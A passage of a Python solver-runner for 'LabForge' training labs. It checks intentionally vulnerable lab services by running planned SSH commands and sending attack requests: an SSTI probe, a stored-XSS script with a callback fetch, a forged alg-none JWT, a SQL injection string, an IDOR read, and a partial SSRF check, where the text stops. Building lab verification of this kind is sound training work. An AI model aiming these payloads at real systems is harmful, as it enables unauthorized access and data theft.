from __future__ import annotations

import json
import shlex
import shutil
import subprocess
import time
from pathlib import Path
from typing import Literal
from urllib.error import HTTPError, URLError
from urllib.parse import quote
from urllib.request import Request, urlopen

from pydantic import BaseModel, ConfigDict, Field

from .io import dump_yaml, write_text


SolverStepStatus = Literal["planned", "passed", "warning", "failed", "skipped"]


class SolverRunnerModel(BaseModel):
    model_config = ConfigDict(extra="allow")


class SolverRunStep(SolverRunnerModel):
    order: int
    step_id: str
    action_type: str
    service: str = ""
    plugin: str = ""
    status: SolverStepStatus
    command: str = ""
    target: str = ""
    evidence: list[str] = Field(default_factory=list)
    message: str = ""
    stdout: str = ""
    stderr: str = ""


class SolverRunReport(SolverRunnerModel):
    lab_id: str
    title: str
    mode: Literal["dry-run", "execute"]
    status: Literal["planned", "passed", "warning", "failed"]
    solver_plan: str
    access_manifest: str = ""
    endpoint_manifest: str = ""
    steps: list[SolverRunStep] = Field(default_factory=list)
    browser_targets: list[str] = Field(default_factory=list)
    terminal_targets: list[str] = Field(default_factory=list)
    final_targets: list[str] = Field(default_factory=list)
    service_targets: dict[str, str] = Field(default_factory=dict)
    next_actions: list[str] = Field(default_factory=list)


def run_solver_plan(
    solver_plan: Path,
    out: Path,
    *,
    access_manifest: Path | None = None,
    endpoint_manifest: Path | None = None,
    execute: bool = False,
    timeout_seconds: int = 5,
) -> SolverRunReport:
    solver_plan = solver_plan.resolve()
    out.mkdir(parents=True, exist_ok=True)
    plan = load_json_object(solver_plan)
    access = load_json_object(access_manifest.resolve()) if access_manifest else {}
    endpoints = load_json_object(endpoint_manifest.resolve()) if endpoint_manifest else {}
    browser_targets = browser_targets_from(plan, access)
    terminal_targets = terminal_targets_from(plan, access)
    final_targets = final_targets_from(plan, access)
    service_targets = service_targets_from(access, endpoints)
    steps: list[SolverRunStep] = []
    for raw_step in plan.get("steps", []) or []:
        if isinstance(raw_step, dict):
            steps.append(
                run_solver_step(
                    raw_step,
                    browser_targets,
                    terminal_targets,
                    final_targets,
                    service_targets,
                    execute=execute,
                    timeout_seconds=timeout_seconds,
                )
            )
    mode: Literal["dry-run", "execute"] = "execute" if execute else "dry-run"
    status = aggregate_solver_status(steps, execute=execute)
    report = SolverRunReport(
        lab_id=str(plan.get("lab_id", "")),
        title=str(plan.get("title", "")),
        mode=mode,
        status=status,
        solver_plan=str(solver_plan),
        access_manifest=str(access_manifest.resolve()) if access_manifest else "",
        endpoint_manifest=str(endpoint_manifest.resolve()) if endpoint_manifest else "",
        steps=steps,
        browser_targets=browser_targets,
        terminal_targets=terminal_targets,
        final_targets=final_targets,
        service_targets=service_targets,
        next_actions=solver_next_actions(plan, browser_targets, terminal_targets, final_targets, execute=execute),
    )
    write_text(out / "solver-run.yaml", dump_yaml(report.model_dump()))
    write_text(out / "solver-run.json", report.model_dump_json(indent=2))
    write_text(out / "solver-run.md", render_solver_run_markdown(report))
    return report


def load_json_object(path: Path) -> dict:
    if not path.exists():
        raise FileNotFoundError(path)
    data = json.loads(path.read_text(encoding="utf-8"))
    if not isinstance(data, dict):
        raise ValueError(f"JSON document is not an object: {path}")
    return data


def browser_targets_from(plan: dict, access: dict) -> list[str]:
    targets: list[str] = []
    for value in [plan.get("learner_start"), *(item.get("connect") for item in access.get("learner_entrypoints", []) or [] if isinstance(item, dict))]:
        target = str(value or "")
        if target.startswith("http") and target not in targets:
            targets.append(target)
    return targets


def terminal_targets_from(plan: dict, access: dict) -> list[str]:
    targets: list[str] = []
    for value in [plan.get("attacker_shell"), *(item.get("connect") for item in access.get("attacker_entrypoints", []) or [] if isinstance(item, dict))]:
        target = str(value or "")
        if target.startswith("ssh ") and target not in targets:
            targets.append(target)
    return targets


def final_targets_from(plan: dict, access: dict) -> list[str]:
    targets: list[str] = []
    for value in [plan.get("final_submission"), *(item.get("connect") for item in access.get("final_submission_endpoints", []) or [] if isinstance(item, dict))]:
        target = str(value or "")
        if target.startswith("http") and target not in targets:
            targets.append(target)
    return targets


def service_targets_from(access: dict, endpoints: dict) -> dict[str, str]:
    targets: dict[str, str] = {}
    collections = (
        access.get("learner_entrypoints", []) or [],
        access.get("attacker_entrypoints", []) or [],
        access.get("final_submission_endpoints", []) or [],
        access.get("tunnel_commands", []) or [],
        endpoints.get("published_endpoints", []) or [],
    )
    for collection in collections:
        if not isinstance(collection, list):
            continue
        for item in collection:
            if not isinstance(item, dict):
                continue
            if str(item.get("protocol", "http")).lower() != "http":
                continue
            service = str(item.get("service", "")).strip()
            url = str(item.get("url") or item.get("connect") or "").strip()
            if service and url.startswith("http"):
                targets.setdefault(service, url.rstrip("/"))
    return targets


def run_solver_step(
    raw_step: dict,
    browser_targets: list[str],
    terminal_targets: list[str],
    final_targets: list[str],
    service_targets: dict[str, str],
    *,
    execute: bool,
    timeout_seconds: int,
) -> SolverRunStep:
    action_type = str(raw_step.get("action_type", "verification"))
    order = int(raw_step.get("order") or 0)
    step_id = str(raw_step.get("step_id", ""))
    service = str(raw_step.get("service", ""))
    plugin = str(raw_step.get("plugin", ""))
    evidence = [str(item) for item in raw_step.get("evidence", []) or []]
    if not execute:
        command_sequence = [str(item).strip() for item in raw_step.get("commands", []) or [] if str(item).strip()]
        return SolverRunStep(
            order=order,
            step_id=step_id,
            action_type=action_type,
            service=service,
            plugin=plugin,
            status="planned",
            target=planned_target(action_type, browser_targets, terminal_targets, final_targets),
            command=" && ".join(command_sequence),
            evidence=evidence,
            message="dry-run",
        )
    if action_type == "access":
        return run_access_solver_step(order, step_id, browser_targets, terminal_targets, evidence, timeout_seconds=timeout_seconds)
    if action_type == "command-sequence":
        return run_command_sequence_solver_step(raw_step, order, step_id, service, plugin, terminal_targets, evidence, timeout_seconds=timeout_seconds)
    if action_type == "final-submission":
        evidence_target = str(raw_step.get("evidence", [""])[0] if raw_step.get("evidence") else "")
        target = ""
        if "http" in evidence_target:
            target = evidence_target.split("http", maxsplit=1)[1]
            target = "http" + target
        return run_final_submission_solver_step(order, step_id, target or planned_target(action_type, browser_targets, terminal_targets, final_targets), service, plugin, evidence, timeout_seconds=timeout_seconds)
    if action_type == "vulnerability-behavior":
        return run_plugin_http_sequence(order, step_id, service, plugin, service_targets.get(service, ""), evidence, timeout_seconds=timeout_seconds)
    return SolverRunStep(
        order=order,
        step_id=step_id,
        action_type=action_type,
        service=service,
        plugin=plugin,
        status="passed" if evidence else "planned",
        evidence=evidence,
        message="non-interactive solver checkpoint",
    )


def run_access_solver_step(order: int, step_id: str, browser_targets: list[str], terminal_targets: list[str], evidence: list[str], *, timeout_seconds: int) -> SolverRunStep:
    if browser_targets:
        return run_http_probe(order, step_id, "access", browser_targets[0], "", "", evidence, timeout_seconds=timeout_seconds)
    if terminal_targets:
        return run_ssh_probe(order, step_id, terminal_targets[0], evidence, timeout_seconds=timeout_seconds)
    return SolverRunStep(order=order, step_id=step_id, action_type="access", status="failed", evidence=evidence, message="no browser or terminal target")


def run_command_sequence_solver_step(
    raw_step: dict,
    order: int,
    step_id: str,
    service: str,
    plugin: str,
    terminal_targets: list[str],
    evidence: list[str],
    *,
    timeout_seconds: int,
) -> SolverRunStep:
    commands = [str(item).strip() for item in raw_step.get("commands", []) or [] if str(item).strip()]
    expected_texts = [str(item).strip() for item in raw_step.get("expected_texts", []) or [] if str(item).strip()]
    connect = str(raw_step.get("terminal") or raw_step.get("connect") or "").strip()
    if not connect and terminal_targets:
        connect = terminal_targets[0]
    if not connect:
        return SolverRunStep(order=order, step_id=step_id, action_type="command-sequence", service=service, plugin=plugin, status="failed", evidence=evidence, message="no terminal target")
    if not commands:
        return SolverRunStep(order=order, step_id=step_id, action_type="command-sequence", service=service, plugin=plugin, status="failed", command=connect, evidence=evidence, message="no commands")
    remote_script = " && ".join(commands)
    display_command = f"{connect} {shlex.quote(remote_script)}"
    argv = ssh_command_sequence_argv(connect, remote_script)
    if not argv:
        return SolverRunStep(order=order, step_id=step_id, action_type="command-sequence", service=service, plugin=plugin, status="skipped", command=display_command, evidence=evidence, message="unsupported SSH command sequence")
    if not shutil.which(argv[0]):
        return SolverRunStep(order=order, step_id=step_id, action_type="command-sequence", service=service, plugin=plugin, status="skipped", command=display_command, evidence=evidence, message="ssh executable missing")
    try:
        completed = subprocess.run(
            argv,
            check=False,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=timeout_seconds,
        )
    except subprocess.TimeoutExpired as exc:
        stdout = exc.stdout.decode("utf-8", "replace") if isinstance(exc.stdout, bytes) else (exc.stdout or "")
        stderr = exc.stderr.decode("utf-8", "replace") if isinstance(exc.stderr, bytes) else (exc.stderr or "")
        return SolverRunStep(
            order=order,
            step_id=step_id,
            action_type="command-sequence",
            service=service,
            plugin=plugin,
            status="failed",
            command=display_command,
            evidence=evidence,
            stdout=stdout.strip(),
            stderr=stderr.strip(),
            message=f"command sequence timed out after {timeout_seconds}s",
        )
    stdout = completed.stdout.strip()
    stderr = completed.stderr.strip()
    if completed.returncode != 0:
        return SolverRunStep(
            order=order,
            step_id=step_id,
            action_type="command-sequence",
            service=service,
            plugin=plugin,
            status="failed",
            command=display_command,
            evidence=evidence,
            stdout=stdout,
            stderr=stderr,
            message=f"exit_code={completed.returncode}",
        )
    missing = [text for text in expected_texts if text not in stdout and text not in stderr]
    if missing:
        return SolverRunStep(
            order=order,
            step_id=step_id,
            action_type="command-sequence",
            service=service,
            plugin=plugin,
            status="warning",
            command=display_command,
            evidence=evidence,
            stdout=stdout,
            stderr=stderr,
            message=f"exit_code=0; missing_expected_text={','.join(missing)}",
        )
    return SolverRunStep(
        order=order,
        step_id=step_id,
        action_type="command-sequence",
        service=service,
        plugin=plugin,
        status="passed",
        command=display_command,
        evidence=evidence,
        stdout=stdout,
        stderr=stderr,
        message=f"exit_code=0; commands={len(commands)}; matched_expected_text={len(expected_texts)}",
    )


def run_http_probe(order: int, step_id: str, action_type: str, target: str, service: str, plugin: str, evidence: list[str], *, timeout_seconds: int) -> SolverRunStep:
    if not target.startswith("http"):
        return SolverRunStep(order=order, step_id=step_id, action_type=action_type, service=service, plugin=plugin, status="skipped", target=target, evidence=evidence, message="no HTTP target")
    try:
        request = Request(target, headers={"User-Agent": "LabForge-SolverRunner/1.0"})
        with urlopen(request, timeout=timeout_seconds) as response:
            body = response.read(256).decode("utf-8", "replace")
            ok = 200 <= int(response.status) < 500
            return SolverRunStep(
                order=order,
                step_id=step_id,
                action_type=action_type,
                service=service,
                plugin=plugin,
                status="passed" if ok else "failed",
                target=target,
                evidence=evidence,
                stdout=body,
                message=f"http_status={response.status}",
            )
    except URLError as exc:
        return SolverRunStep(order=order, step_id=step_id, action_type=action_type, service=service, plugin=plugin, status="failed", target=target, evidence=evidence, message=str(exc))


def run_final_submission_solver_step(order: int, step_id: str, target: str, service: str, plugin: str, evidence: list[str], *, timeout_seconds: int) -> SolverRunStep:
    if not target.startswith("http"):
        return SolverRunStep(order=order, step_id=step_id, action_type="final-submission", service=service, plugin=plugin, status="skipped", target=target, evidence=evidence, message="no HTTP final submission target")
    base_url = target.rstrip("/")
    probe_status, probe_data, probe_body = http_json("GET", f"{base_url}/", None, timeout_seconds)
    submit_payload = {
        "proof": "LABFORGE_SOLVER_FINAL_PROOF",
        "source": "labforge-solver-runner",
        "evidence": evidence,
    }
    submit_status, submit_data, submit_body = http_json("POST", f"{base_url}/submit", submit_payload, timeout_seconds)
    submissions_status, submissions_data, submissions_body = http_json("GET", f"{base_url}/submissions", None, timeout_seconds)
    items = submissions_data.get("items", []) if isinstance(submissions_data, dict) else []
    recorded = any(
        isinstance(item, dict)
        and isinstance(item.get("payload"), dict)
        and item["payload"].get("proof") == submit_payload["proof"]
        for item in items
    )
    ok = (
        200 <= probe_status < 500
        and submit_status in {200, 201, 202}
        and submit_data.get("accepted") is True
        and submissions_status == 200
        and recorded
    )
    message = (
        f"probe={probe_status}; submit={submit_status}; accepted={submit_data.get('accepted')}; "
        f"submissions={submissions_status}; recorded={str(recorded).lower()}"
    )
    body = "\n".join(part for part in [probe_body[:256], submit_body[:256], submissions_body[:256]] if part)
    return SolverRunStep(
        order=order,
        step_id=step_id,
        action_type="final-submission",
        service=service,
        plugin=plugin,
        status="passed" if ok else "failed",
        target=base_url,
        evidence=evidence,
        stdout=body,
        message=message,
    )


def run_plugin_http_sequence(
    order: int,
    step_id: str,
    service: str,
    plugin: str,
    base_url: str,
    evidence: list[str],
    *,
    timeout_seconds: int,
) -> SolverRunStep:
    if not base_url:
        return SolverRunStep(
            order=order,
            step_id=step_id,
            action_type="vulnerability-behavior",
            service=service,
            plugin=plugin,
            status="skipped",
            evidence=evidence,
            message="service is not published as an HTTP endpoint",
        )
    discovery_status, discovery_data, _ = http_json("GET", f"{base_url}/operations/reference", None, timeout_seconds)
    discovery_note = discovery_message(discovery_status, discovery_data)
    runbook_status, runbook_body, runbook_route = http_text_first("GET", base_url, ["/operations/runbook"], timeout_seconds)
    runbook_note = runbook_message(runbook_status, runbook_body, runbook_route)
    routes_status, routes_data, _ = http_json("GET", f"{base_url}/operations/routes?format=json", None, timeout_seconds)
    routes_note = route_catalog_message(routes_status, routes_data)
    routes_ok = routes_status == 200 and bool(routes_data.get("routes"))
    context_status, context_data, _ = http_json("GET", f"{base_url}/operations/context?format=json", None, timeout_seconds)
    operations_context_note = operations_context_message(context_status, context_data)
    context_ok = context_status == 200 and bool(context_data.get("records"))
    landing_ok, landing_note = plugin_landing_probe(base_url, plugin, timeout_seconds)
    landing_ok = landing_ok and routes_ok and context_ok
    context_note = f"{discovery_note}; {runbook_note}; {routes_note}; {operations_context_note}; {landing_note}"
    if plugin == "ssti-preview":
        context_status, preview_context, _, context_route = http_json_first(
            "GET",
            base_url,
            ["/api/preview/context", "/labforge/scaffold/ssti-preview/context"],
            None,
            timeout_seconds,
        )
        normal_status, normal_data, _, normal_route = http_json_first(
            "POST",
            base_url,
            ["/operations/preview", "/labforge/scaffold/ssti-preview"],
            {"body": "Hello {{ customer.name }} from {{ service.name }}"},
            timeout_seconds,
        )
        status, data, body, route = http_json_first(
            "POST",
            base_url,
            ["/operations/preview", "/labforge/scaffold/ssti-preview"],
            {"body": "{{ 7*7 }}"},
            timeout_seconds,
        )
        audit_status, audit, _, audit_route = http_json_first(
            "GET",
            base_url,
            ["/api/preview/audit", "/labforge/scaffold/ssti-preview/audit"],
            None,
            timeout_seconds,
        )
        audit_records = audit.get("records", []) if isinstance(audit, dict) else []
        unexpected_recorded = any(isinstance(record, dict) and record.get("classification") == "unexpected-expression" for record in audit_records)
        ok = (
            landing_ok
            and context_status == 200
            and normal_status == 200
            and status == 200
            and audit_status == 200
            and "Avery Stone" in str(normal_data.get("preview", ""))
            and str(data.get("preview", "")) == "49"
            and unexpected_recorded
        )
        return plugin_step(
            order,
            step_id,
            service,
            plugin,
            base_url,
            evidence,
            ok,
            (
                f"{context_note}; context_route={context_route}; normal_route={normal_route}; "
                f"route={route}; audit_route={audit_route}; context={context_status}; normal={normal_status}; "
                f"http_status={status}; audit={audit_status}; preview={data.get('preview', body[:64])}; "
                f"unexpected_recorded={unexpected_recorded}"
            ),
        )
    if plugin == "stored-xss-review":
        policy_status, policy, _, policy_route = http_json_first(
            "GET",
            base_url,
            ["/operations/reviewer/policy", "/labforge/scaffold/reviewer/policy"],
            None,
            timeout_seconds,
        )
        workflow_status, workflow, _, workflow_route = http_json_first(
            "GET",
            base_url,
            ["/operations/reviewer/workflow", "/labforge/scaffold/reviewer/workflow"],
            None,
            timeout_seconds,
        )
        contract_status, contract, _, contract_route = http_json_first(
            "GET",
            base_url,
            ["/operations/reviewer/render-contract", "/labforge/scaffold/reviewer/render-contract"],
            None,
            timeout_seconds,
        )
        bot_status, bot, _, bot_status_route = http_json_first(
            "GET",
            base_url,
            ["/operations/reviewer/bot/status", "/labforge/scaffold/reviewer/bot/status"],
            None,
            timeout_seconds,
        )
        contract_fields = contract.get("fields", []) if isinstance(contract, dict) else []
        rich_text_body_field = any(
            isinstance(field, dict)
            and field.get("name") == "body"
            and field.get("rendering") == "legacy-rich-text"
            and field.get("reviewer_visible") is True
            for field in contract_fields
        )
        callback_endpoint = str(contract.get("callback_intake_api") or workflow.get("callback_intake_api") or "POST /operations/reviewer/callback")
        callback_path = callback_endpoint.split(" ", 1)[1] if " " in callback_endpoint else "/operations/reviewer/callback"
        created_status, created, _, create_route = http_json_first(
            "POST",
            base_url,
            ["/operations/review-items", "/labforge/scaffold/review-items"],
            {
                "title": "Solver review",
                "body": f"<b>stored</b><script>fetch('{callback_path}',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{'source':'solver-review','note':'callback-received'}})}})</script>",
            },
            timeout_seconds,
        )
        item_id = str(created.get("id", ""))
        bot_run_status, bot_run, _, bot_run_route = http_json_first(
            "POST",
            base_url,
            ["/operations/reviewer/bot/run", "/labforge/scaffold/reviewer/bot/run"],
            {"trigger": "solver-runner"},
            timeout_seconds,
        )
        opened_status, _, opened_body, open_route = (
            http_json_first("GET", base_url, [f"/operations/reviewer/items/{item_id}", f"/labforge/scaffold/reviewer/items/{item_id}"], None, timeout_seconds)
            if item_id
            else (0, {}, "", "")
        )
        context_status, reviewer_context, _, context_route = http_json_first(
            "GET",
            base_url,
            ["/operations/reviewer/context", "/labforge/scaffold/reviewer/context"],
            None,
            timeout_seconds,
        )
        callback_status, callback, _, callback_route = http_json_first(
            "POST",
            base_url,
            ["/operations/reviewer/callback", "/labforge/scaffold/reviewer/callback"],
            {"source": "solver-runner", "item_id": item_id},
            timeout_seconds,
        )
        audit_status, audit, _, audit_route = http_json_first(
            "GET",
            base_url,
            ["/operations/reviewer/audit", "/labforge/scaffold/reviewer/audit"],
            None,
            timeout_seconds,
        )
        records = audit.get("records", []) if isinstance(audit, dict) else []
        item_created = any(isinstance(item, dict) and item.get("action") == "item-created" and item.get("accepted") is True for item in records)
        bot_ran = any(isinstance(item, dict) and item.get("action") == "bot-run" and item.get("accepted") is True for item in records)
        item_opened = any(isinstance(item, dict) and item.get("action") == "item-opened" and item.get("accepted") is True for item in records)
        context_recorded = any(isinstance(item, dict) and item.get("action") == "context-read" and item.get("accepted") is True for item in records)
        callback_recorded = any(isinstance(item, dict) and item.get("action") == "callback-received" and item.get("accepted") is True for item in records)
        ok = (
            landing_ok
            and policy_status == 200
            and policy.get("audit_api") == "GET /operations/reviewer/audit"
            and workflow_status == 200
            and workflow.get("render_contract_api") == "GET /operations/reviewer/render-contract"
            and contract_status == 200
            and rich_text_body_field
            and bot_status == 200
            and bot.get("enabled") is True
            and created_status == 201
            and bot_run_status == 202
            and bot_run.get("reviewed_count", 0) >= 1
            and opened_status == 200
            and "stored" in opened_body
            and "reviewer/context" in opened_body
            and context_status == 200
            and isinstance(reviewer_context.get("session_context"), dict)
            and callback_status == 202
            and callback.get("accepted") is True
            and audit_status == 200
            and item_created
            and bot_ran
            and item_opened
            and context_recorded
            and callback_recorded
        )
        return plugin_step(
            order,
            step_id,
            service,
            plugin,
            base_url,
            evidence,
            ok,
            (
                f"{context_note}; policy_route={policy_route}; bot_status_route={bot_status_route}; create_route={create_route}; "
                f"workflow_route={workflow_route}; contract_route={contract_route}; "
                f"bot_run_route={bot_run_route}; open_route={open_route}; context_route={context_route}; callback_route={callback_route}; "
                f"audit_route={audit_route}; policy={policy_status}; workflow={workflow_status}; render_contract={contract_status}; "
                f"rich_text_body_field={rich_text_body_field}; bot_status={bot_status}; created={created_status}; "
                f"bot_run={bot_run_status}; reviewed_count={bot_run.get('reviewed_count', 0)}; opened={opened_status}; "
                f"context={context_status}; callback={callback_status}; audit={audit_status}; item_created={item_created}; bot_ran={bot_ran}; "
                f"item_opened={item_opened}; context_recorded={context_recorded}; callback_recorded={callback_recorded}; item_id={item_id or '-'}"
            ),
        )
    if plugin == "idor-object-access":
        catalog_status, catalog, _, catalog_route = http_json_first(
            "GET",
            base_url,
            ["/api/business-objects?owner=learner", "/labforge/scaffold/objects?owner=learner"],
            None,
            timeout_seconds,
        )
        policy_status, policy, _, policy_route = http_json_first(
            "GET",
            base_url,
            ["/api/business-objects/access-policy", "/labforge/scaffold/objects/access-policy"],
            None,
            timeout_seconds,
        )
        review_status, review, _, review_route = http_json_first(
            "GET",
            base_url,
            ["/api/business-objects/access-review?owner=learner", "/labforge/scaffold/objects/access-review?owner=learner"],
            None,
            timeout_seconds,
        )
        review_cases = review.get("cases", []) if isinstance(review, dict) else []
        target_object_id = "obj-9001"
        for case in review_cases:
            if isinstance(case, dict) and case.get("risk") == "high" and case.get("object_id"):
                target_object_id = str(case["object_id"])
                break
        entitlement_status, entitlement, _, entitlement_route = http_json_first(
            "GET",
            base_url,
            [
                f"/api/business-objects/{target_object_id}/entitlement?owner=learner",
                f"/labforge/scaffold/objects/{target_object_id}/entitlement?owner=learner",
            ],
            None,
            timeout_seconds,
        )
        relationship_status, relationship, _, relationship_route = http_json_first(
            "GET",
            base_url,
            [
                f"/api/business-objects/{target_object_id}/relationship?owner=learner",
                f"/labforge/scaffold/objects/{target_object_id}/relationship?owner=learner",
            ],
            None,
            timeout_seconds,
        )
        status, data, _, route = http_json_first(
            "GET",
            base_url,
            [f"/api/business-objects/{target_object_id}?owner=learner", f"/labforge/scaffold/objects/{target_object_id}?owner=learner"],
            None,
            timeout_seconds,
        )
        audit_status, audit, _, audit_route = http_json_first(
            "GET",
            base_url,
            ["/api/business-objects/audit", "/labforge/scaffold/objects/audit"],
            None,
            timeout_seconds,
        )
        visible_ids = {str(item.get("id")) for item in catalog.get("items", []) if isinstance(item, dict)}
        audit_records = audit.get("records", []) if isinstance(audit, dict) else []
        direct_read_audited = any(
            isinstance(record, dict)
            and record.get("object_id") == target_object_id
            and record.get("action") == "direct-read"
            and record.get("allowed_by_entitlement") is False
            and record.get("visible_in_catalog") is False
            and record.get("provenance", {}).get("policy_gap") is True
            for record in audit_records
        )
        review_case_found = any(
            isinstance(case, dict)
            and case.get("object_id") == target_object_id
            and case.get("requester") == "learner"
            and case.get("relationship_api")
            and case.get("detail_api")
            for case in review_cases
        )
        ok = (
            landing_ok
            and catalog_status == 200
            and target_object_id not in visible_ids
            and policy_status == 200
            and review_status == 200
            and review_case_found
            and entitlement_status == 200
            and entitlement.get("allowed") is False
            and entitlement.get("decision", {}).get("entitlement_allowed") is False
            and relationship_status == 200
            and relationship.get("catalog_visible") is False
            and relationship.get("entitlement_allowed") is False
            and status == 200
            and data.get("decision", {}).get("policy_gap") is True
            and audit_status == 200
            and "LABFORGE_SYNTHETIC_OBJECT" in str(data.get("content", ""))
            and direct_read_audited
        )
        return plugin_step(
            order,
            step_id,
            service,
            plugin,
            base_url,
            evidence,
            ok,
            (
                f"{context_note}; catalog_route={catalog_route}; policy_route={policy_route}; review_route={review_route}; entitlement_route={entitlement_route}; relationship_route={relationship_route}; "
                f"route={route}; audit_route={audit_route}; catalog={catalog_status}; policy={policy_status}; "
                f"review={review_status}; review_case_found={review_case_found}; target_object_id={target_object_id}; "
                f"entitlement={entitlement_status}; entitlement_allowed={entitlement.get('allowed')}; relationship={relationship_status}; "
                f"relationship_visible={relationship.get('catalog_visible')}; direct_read={status}; policy_gap={data.get('decision', {}).get('policy_gap')}; "
                f"audit={audit_status}; direct_read_audited={direct_read_audited}"
            ),
        )
    if plugin == "jwt-role-confusion":
        import base64

        def b64url(value: dict) -> str:
            raw = json.dumps(value, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
            return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")

        session_status, session, _, session_route = http_json_first(
            "GET",
            base_url,
            ["/api/identity/session", "/labforge/scaffold/identity/session"],
            None,
            timeout_seconds,
        )
        policy_status, policy, _, policy_route = http_json_first(
            "GET",
            base_url,
            ["/api/identity/policy", "/labforge/scaffold/identity/policy"],
            None,
            timeout_seconds,
        )
        analyst_token = str(session.get("token") or "")
        denied_status, denied, _, denied_route = http_json_first(
            "GET",
            base_url,
            [
                f"/api/identity/admin/export?token={quote(analyst_token)}",
                f"/labforge/scaffold/identity/admin/export?token={quote(analyst_token)}",
            ],
            None,
            timeout_seconds,
        )
        target_role = str(policy.get("target_role") or "admin")
        issuer = str(policy.get("issuer") or "labforge-idp")
        forged_token = (
            f"{b64url({'typ': 'JWT', 'alg': 'none', 'kid': 'ops-2026'})}."
            f"{b64url({'iss': issuer, 'sub': 'learner.analyst', 'role': target_role, 'scope': 'reports:read identity:preview', 'aud': service})}."
        )
        preview_status, preview, _, preview_route = http_json_first(
            "POST",
            base_url,
            ["/api/identity/token-preview", "/labforge/scaffold/identity/token-preview"],
            {"token": forged_token},
            timeout_seconds,
        )
        accepted_status, accepted, _, accepted_route = http_json_first(
            "GET",
            base_url,
            [
                f"/api/identity/admin/export?token={quote(forged_token)}",
                f"/labforge/scaffold/identity/admin/export?token={quote(forged_token)}",
            ],
            None,
            timeout_seconds,
        )
        audit_status, audit, _, audit_route = http_json_first(
            "GET",
            base_url,
            ["/api/identity/audit", "/labforge/scaffold/identity/audit"],
            None,
            timeout_seconds,
        )
        records = audit.get("records", []) if isinstance(audit, dict) else []
        denied_recorded = any(
            isinstance(record, dict)
            and record.get("action") == "admin-export"
            and record.get("accepted") is False
            for record in records
        )
        accepted_recorded = any(
            isinstance(record, dict)
            and record.get("action") == "admin-export"
            and record.get("accepted") is True
            for record in records
        )
        role_confusion = (
            preview_status == 200
            and preview.get("claims", {}).get("role") == target_role
            and preview.get("signature_valid") is True
            and accepted_status == 200
            and accepted.get("accepted") is True
        )
        ok = (
            landing_ok
            and session_status == 200
            and session.get("role") == policy.get("normal_role", "analyst")
            and bool(analyst_token)
            and policy_status == 200
            and policy.get("preview_api") == "POST /api/identity/token-preview"
            and denied_status == 403
            and role_confusion
            and audit_status == 200
            and denied_recorded
            and accepted_recorded
        )
        return plugin_step(
            order,
            step_id,
            service,
            plugin,
            base_url,
            evidence,
            ok,
            (
                f"{context_note}; session_route={session_route}; policy_route={policy_route}; preview_route={preview_route}; "
                f"denied_route={denied_route}; accepted_route={accepted_route}; audit_route={audit_route}; "
                f"session={session_status}; policy={policy_status}; denied={denied_status}; preview={preview_status}; "
                f"accepted={accepted_status}; audit={audit_status}; role_confusion={role_confusion}; "
                f"denied_recorded={denied_recorded}; audit_recorded={accepted_recorded}"
            ),
        )
    if plugin == "sql-injection-reporting":
        catalog_status, catalog, _, catalog_route = http_json_first(
            "GET",
            base_url,
            ["/api/reports?owner=learner", "/labforge/scaffold/reports?owner=learner"],
            None,
            timeout_seconds,
        )
        policy_status, policy, _, policy_route = http_json_first(
            "GET",
            base_url,
            ["/api/reports/policy", "/labforge/scaffold/reports/policy"],
            None,
            timeout_seconds,
        )
        schema_status, schema, _, schema_route = http_json_first(
            "GET",
            base_url,
            ["/api/reports/schema", "/labforge/scaffold/reports/schema"],
            None,
            timeout_seconds,
        )
        normal_status, normal, _, normal_route = http_json_first(
            "GET",
            base_url,
            ["/api/reports/search?owner=learner&q=quarterly", "/labforge/scaffold/reports/search?owner=learner&q=quarterly"],
            None,
            timeout_seconds,
        )
        injected_status, injected, _, injected_route = http_json_first(
            "GET",
            base_url,
            ["/api/reports/search?owner=learner&q=%25%27%20OR%20%271%27%3D%271%27%20--", "/labforge/scaffold/reports/search?owner=learner&q=%25%27%20OR%20%271%27%3D%271%27%20--"],
            None,
            timeout_seconds,
        )
        audit_status, audit, _, audit_route = http_json_first(
            "GET",
            base_url,
            ["/api/reports/audit", "/labforge/scaffold/reports/audit"],
            None,
            timeout_seconds,
        )
        normal_items = normal.get("items", []) if isinstance(normal, dict) else []
        injected_items = injected.get("items", []) if isinstance(injected, dict) else []
        audit_records = audit.get("records", []) if isinstance(audit, dict) else []
        normal_restricted = any(isinstance(item, dict) and item.get("classification") == "restricted" for item in normal_items)
        restricted_returned = any(isinstance(item, dict) and item.get("id") == "rpt-9001" and item.get("export_reference") for item in injected_items)
        audit_recorded = any(
            isinstance(record, dict)
            and record.get("action") == "search"
            and int((record.get("detail") or {}).get("restricted_rows_returned") or 0) > 0
            for record in audit_records
        )
        ok = (
            landing_ok
            and catalog_status == 200
            and policy_status == 200
            and policy.get("schema_api") == "GET /api/reports/schema"
            and schema_status == 200
            and "export_reference" in schema.get("columns", [])
            and normal_status == 200
            and not normal_restricted
            and injected_status == 200
            and injected.get("restricted_rows_returned", 0) >= 1
            and restricted_returned
            and audit_status == 200
            and audit_recorded
        )
        return plugin_step(
            order,
            step_id,
            service,
            plugin,
            base_url,
            evidence,
            ok,
            (
                f"{context_note}; catalog_route={catalog_route}; policy_route={policy_route}; schema_route={schema_route}; "
                f"normal_route={normal_route}; injected_route={injected_route}; audit_route={audit_route}; "
                f"catalog={catalog_status}; policy={policy_status}; schema={schema_status}; normal={normal_status}; "
                f"injected={injected_status}; restricted_returned={restricted_returned}; audit={audit_status}; audit_recorded={audit_recorded}"
            ),
        )
    if plugin == "ssrf-internal-fetch":
        registry_status, registry, _, registry_route = http_json_first(
            "GET",
            base_url,
            ["/api/source-registry", "/labforge/scaffold/source-registry"],
            None,
            timeout_seconds,
        )
        sources = registry.get("sources", []) if isinstance(registry, dict) else []
        approved_source = ""
        source_id = ""
        for source in sources:
            if isinstance(source, dict) and source.get("status") == "approved" and source.get("url"):
                approved_source = str(source["url"])
                source_id = str(source.get("id") or "")
                break
        if not approved_source:
            approved_source = "http://metadata-service:8080/metadata"
            source_id = "src-metadata-service"
        jobs_status, jobs, _, jobs_route = http_json_first(
            "GET",
            base_url,
            ["/api/import-jobs"],
            None,
            timeout_seconds,
        )
        job_records = jobs.get("jobs", []) if isinstance(jobs, dict) else []
        job_links_source = any(
            isinstance(job, dict)
            and job.get("source_id") == source_id
            and str(job.get("validation_plan_api", "")).endswith(f"/{source_id}/validation-plan")
            for job in job_records
        )
